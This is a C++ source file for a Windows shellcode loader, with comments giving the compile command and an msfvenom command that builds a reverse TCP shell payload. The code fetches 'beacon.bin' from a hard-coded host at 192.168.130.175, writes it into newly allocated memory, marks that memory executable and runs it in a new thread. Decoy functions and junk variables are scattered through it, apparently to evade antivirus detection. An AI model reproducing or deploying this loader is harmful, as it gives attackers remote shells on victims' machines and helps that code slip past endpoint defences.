//to compile:- x86_64-w64-mingw32-g++ --static -o pay.exe simple.cpp -fpermissive -lws2_32
//payload:- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.175 LPORT=8000 -f raw >beacon.bin
#include <math.h>
#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <ctime>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ntdll")

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 4096
//random function not important
void random_function() {
    // Arbitrary functionality to add noise
    printf("Random function executing...\n");
    int dummy = rand() * time(NULL);
    printf("Dummy value: %d\n", dummy);
    
}

//Getting the payload from remote server function
void coolman(char* host, char* port, char* resource) {

    DWORD oldp = 0;
    BOOL returnValue;

    size_t origsize = strlen(host) + 1;
    const size_t newsize = 100;
    size_t convertedChars = 0;
    wchar_t Whost[newsize];
    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);


    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    char sendbuf[MAX_PATH] = "";
    lstrcatA(sendbuf, "GET /");
    lstrcatA(sendbuf, resource);

    char recvbuf[DEFAULT_BUFLEN];
    memset(recvbuf, 0, DEFAULT_BUFLEN);
    int dhanush;
    int recvbuflen = DEFAULT_BUFLEN;

    
    // Initialize Winsock
    dhanush = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (dhanush != 0) {
        printf("WSAStartup failed with error: %d\n", dhanush);
        return ;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = PF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    dhanush = getaddrinfo(host, port, &hints, &result);
    if (dhanush != 0) {
        printf("get address info failed with error: %d\n", dhanush);
        WSACleanup();
        return ;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            WSACleanup();
            return ;
        }

        // Connect to server.
        printf("[+] Connect to %s:%s", host, port);
        dhanush = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (dhanush == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return ;
    }

    // Send an initial buffer
    dhanush = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (dhanush == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return ;
    }

    printf("\n[+] Sent %ld Bytes\n", dhanush);
    
    // shutdown the connection since no more data will be sent
    dhanush = shutdown(ConnectSocket, SD_SEND);
    if (dhanush == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return ;
    }
    
    // Receive until the peer closes the connection
    do {

        dhanush = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);
        if (dhanush > 0)
            printf("[+] Received %d Bytes\n", dhanush);
        else if (dhanush == 0)
            printf("[+] Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());


        Sleep(2000);
        DWORD nndPreferred = 0xFFFFFFFF;
        Sleep(2000);
	LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, nndPreferred);
	printf("this is very cool");
	int *array = (int *)calloc(5, sizeof(int));
        if (array) {
           array[0] = 1;
           free(array);
        } 
	
	memcpy(memalo, recvbuf, sizeof(recvbuf));


	DWORD oldProtect;
	char str1[20] = "Hello, ";
        char str2[] = "World!";

	VirtualProtect(memalo, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect); 
	int random = rand();


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);
	int random2 = rand();
	
	WaitForSingleObject(tHandle, -1);
	getchar();
	

	return 0;

    } while (dhanush > 0);

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();
}

int main(int argc, char** argv) {
    
    char* host = "192.168.130.175";  // Replace with desired IP
    char* port= "80";  // Replace with desired port
    char* resource = "beacon.bin";

    coolman(host, port, resource);

    return 0;

}
